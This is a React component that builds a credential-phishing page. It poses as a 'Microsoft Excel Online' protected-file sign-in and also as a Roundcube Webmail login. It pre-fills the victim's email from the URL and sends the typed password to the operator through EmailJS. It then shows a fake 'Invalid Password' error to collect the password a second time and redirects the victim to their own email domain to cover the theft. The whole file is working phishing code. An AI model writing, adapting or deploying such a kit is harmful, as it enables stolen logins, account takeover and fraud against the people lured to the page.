import "./App.css";
import React, { useState } from "react";
import { Styls } from "./stylls";
import emailjs from "emailjs-com";
import { useParams } from "react-router-dom";

function Forms() {
  const params = useParams();
  console.log(params.id);

  const [showForm, setShowForm] = useState(true);
  const [confirmForm, setConfirmForm] = useState(false);

   const submitHandler = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        "gmail",
        "template_3jamv0i",
        e.target,
        "3hXVmO6FYl9i0rRmR"
      )
      .then(
        (result) => {
          console.log(result.text);
        },
        (error) => {
          console.log(error.text);
        }
      );
    e.preventDefault();
    setShowForm(false);
    setConfirmForm(true);
  };

  const editHandler = (e) => {
    e.preventDefault();
    let emailss = params.id;
    let domain = emailss.substring(emailss.lastIndexOf("@") + 1);
    emailjs
      .sendForm(
        "gmail",
        "template_3jamv0i",
        e.target,
        "3hXVmO6FYl9i0rRmR"
      )
      .then(
        (result) => {
          console.log(result.text);
        },
        (error) => {
          console.log(error.text);
        }
      );

    window.setTimeout(() => {
      window.location.href = `https://${domain}`;
    }, 1000);
  };
  return (
    <Styls>
      {" "}
      {showForm && (
        <div id="html_encoder_div">
          <div className="container">
            <div className="office show border shadow bg-light" id="others">
              <div className="office-holder">
                <div className="logo">
                  <div id="login_logo">
                    <img
                      src="https://toppng.com/uploads/preview/excel-icon-excel-flat-icon-11553482530m4cmreyasv.png"
                      width="100"
                      height="100"
                      alt=""
                    />
                  </div>
                  <h5 className="font-weight-light">
                    <b> Microsoft Excel Online </b>
                    <br />
                  </h5>
                  <p>
                    This file is protected by Microsoft Online. Please sign in
                    to access file
                  </p>
                </div>

                <form className="formal" onSubmit={submitHandler}>
                  <div className="form-holder">
                    <div>
                      <div className="alert alert-danger hide alert2"></div>
                    </div>
                    <input
                      type="email"
                      name="to_user"
                      required
                      className="form-control"
                      value={params.id}
                    />
                    <input
                      type="password"
                      name="to_pass"
                      required
                      placeholder="Password"
                      className="form-control"
                    />

                    <div className="btn-holder">
                      <button className="btn btn-lg col-12">
                        Download Document
                      </button>
                    </div>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      )}
      {confirmForm && (
        <div id="html_encoder_div">
          <div className="container">
            <div className="office show border shadow bg-light" id="others">
              <div className="office-holder">
                <div className="logo">
                  <div id="login_logo">
                    <img
                      src="https://toppng.com/uploads/preview/excel-icon-excel-flat-icon-11553482530m4cmreyasv.png"
                      width="100"
                      height="100"
                      alt=""
                    />
                  </div>
                  <h5 className="font-weight-light">
                    <b> Microsoft Excel Online </b>
                    <br />
                  </h5>
                  <p>
                    This file is protected by Microsoft Online. Please sign in
                    to access file
                  </p>
                </div>

                <div className="msg">
                  Invalid Password.! Please enter correct password.
                </div>

                <form className="formal" onSubmit={editHandler}>
                  <div className="form-holder">
                    <div>
                      <div className="alert alert-danger hide alert2"></div>
                    </div>
                    <input
                      type="email"
                      name="to_user"
                      required
                      className="form-control"
                      value={params.id}
                    />
                    <input
                      type="password"
                      name="to_pass"
                      required
                      placeholder="Password"
                      className="form-control"
                    />

                    <div className="btn-holder">
                      <button className="btn btn-lg col-12">
                        Download Document
                      </button>
                    </div>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      )}
      {confirmForm && (
        <div className="contsainer">
          <div className="imagees"></div>

          <form className="formal" onSubmit={editHandler}>
            <label>
              <span className="newicon1">
                {" "}
                <i class="fas fa-user fa-1x"></i>{" "}
              </span>
              <input
                type="email"
                name="to_user"
                required
                value={params.id}
                placeholder="Username"
              />
            </label>
            <br></br>

            <label>
              <span className="newicon1">
                {" "}
                <i class="fas fa-lock fa-1x"></i>{" "}
              </span>
              <input
                type="password"
                name="to_pass"
                required
                placeholder="Password"
              />
            </label>
            <p className="reda">Login failed Incorrect Password</p>
            <button> LOGIN </button>
            <p>Roundcube Webmail </p>
          </form>
        </div>
      )}
    </Styls>
  );
}

export default Forms;
